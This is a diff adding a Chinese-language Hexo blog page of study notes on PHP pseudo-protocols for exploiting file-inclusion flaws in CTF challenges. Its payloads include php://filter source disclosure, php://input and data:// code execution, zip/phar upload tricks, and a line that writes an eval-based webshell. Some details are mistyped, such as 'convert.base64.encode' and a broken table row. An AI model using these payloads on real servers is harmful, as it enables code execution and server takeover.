@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html>
+  <!-- Html Head Tag-->
+  <head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="伪协议"/>
+  <meta property="og:description" content="" />
+  <meta property="og:site_name" content="Hexo"/>
+  <meta property="og:type" content="article" />
+  <meta property="og:image" content="http://example.com"/>
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+  <!-- Site Title -->
+  <title>Hexo</title>
+
+  <!-- Bootstrap CSS -->
+  
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
+  <!-- Custom CSS -->
+  
+  
+<link rel="stylesheet" href="/css/style.light.css">
+
+
+  <!-- Google Analytics -->
+  
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+  <body>
+    <!-- Page Header -->
+
+
+<header class="site-header header-background" style="background-image: url(/img/default-banner-dark.jpg)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">伪协议</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  
+                  Archives
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://github.com/<your-github-username>">
+                  
+                  Github
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="mailto:<your-email-address>">
+                  
+                  Email
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By John Doe</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2020-12-02</span>
+            <span class="time">21:20:55</span>
+          </span>
+          
+        </div>
+        <!-- Tags -->
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          <p>#前言<br>伪协议的学习</p>
+<a id="more"></a>
+
+<p><font color="DarkSeaGreen">伪协议的学习</font></p>
+
+<p>php伪协议常用于文件包含漏洞中，在php中能进行文件包含的函数有，include（），require（），require_once（），include_once（），highlight_file（），show_source（），file_get_contents（），file（）等</p>
+<h1>include函数</h1><br>
+    可以放在php脚本的任意部位，一般放在流程流程控制的处理部分中。当php执行到include指定引入的文件时，才将他包含并尝试执行。当第二次遇到相同的函数时，php还是会重新解释，同时在引入文件包含用户自定义函数使，php在解释的过程中会发生函数重新定义的问题。成功返回1，失败返回false
+<h1>require函数</h1>
+    require函数一般放在php脚本的最前面，php执行前就会读入require指定引入的文件，包含并尝试执行引入的脚本文件。当它在统一的网页中解释后，第二次便不会解释。但同时因为它不会重复解释引入文件，所以当php中使用循环或条件语句来引入文件时，需要用到include。成功载入1，失败无返回值。
+<h1>include_once和require_once函数</h1>
+    分别与include与require的作用相同，不同的是他们在执行到时会先检查目标内容是不是在之前已经导入过，如果是那便不会再次重复引用其同样的内容。
+<h1>highlight_file函数</h1>
+    对文件进行语法的高亮显示<br>
+    语法：highlight_file(filename，return)——filename：必需。要进行高亮处理的php文件路径。return：可选。如果设置true，则本函数返回高亮处理的代码。<br>
+    该函数通过使用php语法高亮程序中定义的颜色，输出或返回包含在filename中代码的语法高亮版本。如果return参数被设置为true，那么该函数会返回被高亮处理的代码，而不是输出他们，否则，若成功，则返回true，失败则返回false。许多服务器被配置为对带有phps后缀的文件进行自动高亮处理。
+<h1>show_source函数</h1>
+    是highlight_file函数的别名。
+<h1>file_get_contents函数</h1>
+    把整个文件读到一个字符串中。是首选方法。如果操作系统支持，还会使用内存映射技术来增强性能。<br>
+    语法：file_get_content(path,include_path,context,start,max_length)<br>
+<table border="1">
+   <tr>
+       <th>参数</th>
+       <th>描述</th>
+   </tr>
+   <tr>
+       <td>path</td>
+       <td>必须。规定要读的文件</td>
+   </tr>
+   <tr>
+       <td>include_path</td>
+       <td>可选，如果也想在include_path中设置文件的话，可以将参数设为1</td>
+   </tr>
+  <tr>
+       <td>context</td>
+       <td>可选，规定文件句柄的环境。<br>
+       context是一套可以选择流的行为的选项。若使用null，则忽略。</td>
+  </tr>
+  <tr>
+      <td>start</td>
+      <td>可选。规定在文件中可以读取的位置。</td>
+  </tr> 
+  <tr>max_length</tr>
+  <tr>可选。规定读取的字节数。</tr>
+</table>
+<h1>file函数</h1>
+     把整个文件读入一个数组中。数组中每个单元都是文件中相应的一行，包括换行符在内。如果失败，返回false。<br>
+     语法:file（path，include_path，context）<br>
+     每个参数的含义同上
+<h1>fopen函数</h1>
+<h1>readfile函数</h1>
+<p><font color="DarkSeaGreen">伪协议总结</font></p>
+<h1>file：//协议</h1>
+<ul>    
+ <li>条件：allow_url_fopen  on/off <br>          allow_url_include on/off </li> <br>
+ <li>作用：用于访问本地文件，在ctf通常用来读取本地文件且不受限制。</li>
+<li>说明：file：//文件系统是php使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\或windows盘符开头的路径）提供的路径将基于当前的文件目录。<br>
+<li>示例<br>
+    file：//[文件的绝对路径和文件名]<br>
+    ？file=file：//E：\phpstudy\www\phpinfo.txt<br>
+    [文件的相对路径和文件名]<br>
+    ？file=flag<br>
+    [http：//网络路径和文件名]<br>
+    ?file=http://127.0.0.1/flag</li>
+</ul>
+<h1>php://协议</h1>
+<ul>
+   <li>条件：
+    allow_url_fopen：on/off
+    allow_url_include:   </li>
+   <li>作用：
+    php：//访问各个输入/输出流（i/o streams），在ctf中经常使用的是php：//filter和php：//input，php：//filter用于读取源码，php：//input用于执行php代码。</li>
+  <li><em>php://filter参数详解</em>
+    该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。</li>
+<table border="1">
+<tr>
+    <th>参数</th>
+    <th>描述</th>
+</tr>
+<tr>
+    <td>resource=<要过滤的数据流></td>
+    <td>必须项。它指定了你要筛选过滤的数据流。</td>
+</tr>
+<tr>
+     <td>read=<读链的过滤器></td>
+     <td>可选项。可以设定一个或多个过滤器的名称，以管道符（**）分隔。</td>
+</tr>
+<tr>
+    <td>write=<写链的过滤器></td>
+    <td>可选项。可以设定一个或多个过滤器的名称，以管道符（\)分隔。
+</tr>
+<tr>
+    <td><;两个链的过滤器></td>
+    <td>任何没有以read=和write=作前缀的筛选器列表会视情况应用于读或写链。</td>
+</tr>
+</table>
+<li> 主要的过滤器</li>
+<table border="1">
+<tr>
+    <th>字符串过滤器</th>
+    <th>作用</th>
+</tr>
+<tr>
+    <td>string.rot13</td>
+    <td>等同于str_rot13（），rot13变换</td>
+<tr>
+    <td>string.toupper</td>
+    <td>等同于strtoupper（），转大写字母</td>
+</tr>
+<tr>
+    <td>string.tolower</td>
+    <td>等同于strtolower，转小写字母</td>
+</tr>
+<tr>
+    <td>string.strip_tags</td>
+    <td>等同于strip_tags（），去掉html，php语言标签。</td>
+</tr>
+</table>
+
+<table border="1">
+<tr>
+    <th>转换过滤器</th>
+    <th>作用</th>
+</tr>
+<tr>
+    <td>convert.base64-encode/convert.base64-decode</td>
+    <td>base64的编码解码</td>
+</tr>
+<tr>
+    <td>convert.quoted-printable-encode/convert.quoted-printable-decode quoted-printable</td>
+    <td>字符串与8-bit字符串的编码解码。</td>
+</tr>
+</table>
+<table border="1">
+<tr>
+    <th>压缩过滤器</th>
+    <th>作用</th>
+</tr>
+<tr>
+    <td>zlib.deflate zlib.inflate</td>
+    <td>在本地系统中创建gzip兼容文件的方法，但不产生命令行工具如gzip的头和尾信息。只是压缩与解压数据流中的有效载荷部分</td>
+</tr>
+<tr>
+    <td>bzip2.compress bzip.decompress</td>
+    <td>同上，在本地文件系统中创建bz2兼容文件的方法。</td>
+</tr>
+</table>
+
+<table border="1">
+<tr>
+    <th>加密过滤器</th>
+    <th>作用</th>
+</tr>
+<tr>
+    <td>mcrypt*</td>
+    <td>libmcrypt的对称加密算法</td>
+</tr>
+<tr>
+    <td>mdecryot*</td>
+    <td>libmcrypt的对称解密算法</td>
+</tr>
+</table>
+<li>php：//filter/resource=[文件名]读取文件源码<br>
+    file=php：//filter/resource=flag</li>
+<li>php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码）<br>
+   file=php：//filter/read=convert.base64.encode/resource=flag</li>
+<li>php://input+[POST DATA]执行代码<br>
+   ？file=php：//input
+    [POST DATA部分]&#60;?php phpinfo();?&#62;<br>
+    post data在harkbar中输入</li>
+<li>若有权限可写入一句话木马<br>
+    ?file=php://input<br>
+    [POST DATA]&#60;?php fputs(fopen('yijuhua.php''w'),'&#60;?php @eval($_GET[cmd]);?&#62;');?&#62;</li>
+<h1>zip：//&bzip：//&zlib：//</h1>
+   <li>条件</li><br>
+      不受限制
+   <li>作用<br>
+     zip：//&bzip：//&zlib：//均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：ipg png gif xxx等<br>
+     zip://[压缩文件绝对路径]#(%23)[压缩文件内的子文件名]<br>
+     在文件上传场景下，压缩phpinfo.txt为phpinfo.zip，压缩包重命名为phpinfo.jpg并上传
+     ？file=zip://D:\phpstudy\WWW\phpinfo.jpg%23phpinfo.txt<br></li>
+<em>类似</em>
+     压缩phpinfo.txt为phpinfo.bz2并上传（同样支持任意后缀名）
+     ？file=compress.bzip://D:\phpstudy\WWW\phpinfo.bz2<br>
+     压缩phpinfo.txt为phpinfo.gz并上传（同样支持任意后缀名）
+     ？file=compress.zlib：//D：\phpstude\WWW\phpinfp.gz<br>
+<h1>phar://协议</h1>
+     同zip协议<br>
+     phar：//[压缩文件绝对路径]/[压缩文件内的子文件名]<br>
+     ？file=phar://D:\phpstudy\WWW\phpinfo.zip\phpinfo.txt<br>
+<h1>data：//</h1>
+  <li>条件
+     allow_url_fopen：on
+     allow_url_include：on
+  <li>示例
+     data：//text/plain，<br>
+     ?file=data://text/plain,&#60;?php%20phpinfo();?&#62;<br>
+     data://text/plain;base64,<br>
+     ?file=data://text/plain;base64,PD9waHAlMjBwaHBpbmZvKCk7Pz4=
+<h1>http：//&http：//</h1>
+  <li>条件<br>
+  allow_url_fopen:on
+  allow_url_include:on
+  <li>作用<br>
+  常规url形式，允许通过http1.0的GET方法，以只读访问文件或资源。用于远程包含。
+  <li>？file=http：//127.0.0.1/phpinfo.txt
+
+
+
+
+        </div>
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        <p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+
+<script src="/js/highlight.pack.js"></script>
+
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
+</html>
+
